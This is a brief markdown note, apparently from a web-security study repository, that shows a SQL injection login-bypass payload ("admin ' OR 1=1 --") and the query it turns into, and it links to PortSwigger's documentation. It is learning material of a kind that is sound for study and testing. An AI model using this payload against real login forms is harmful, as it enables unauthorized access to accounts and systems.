# Login

Bypass login:

```sql
username = admin ' OR 1=1 --
password = ?
```

```SQL
SELECT * FROM users WHERE username = 'administrator' OR 1=1 --' AND password = ''
```

Verification return true because 1=1 !

### Documentation

- [portswigger](https://portswigger.net/web-security/sql-injection)

---

[**:arrow_right_hook: Back home**](/README.md)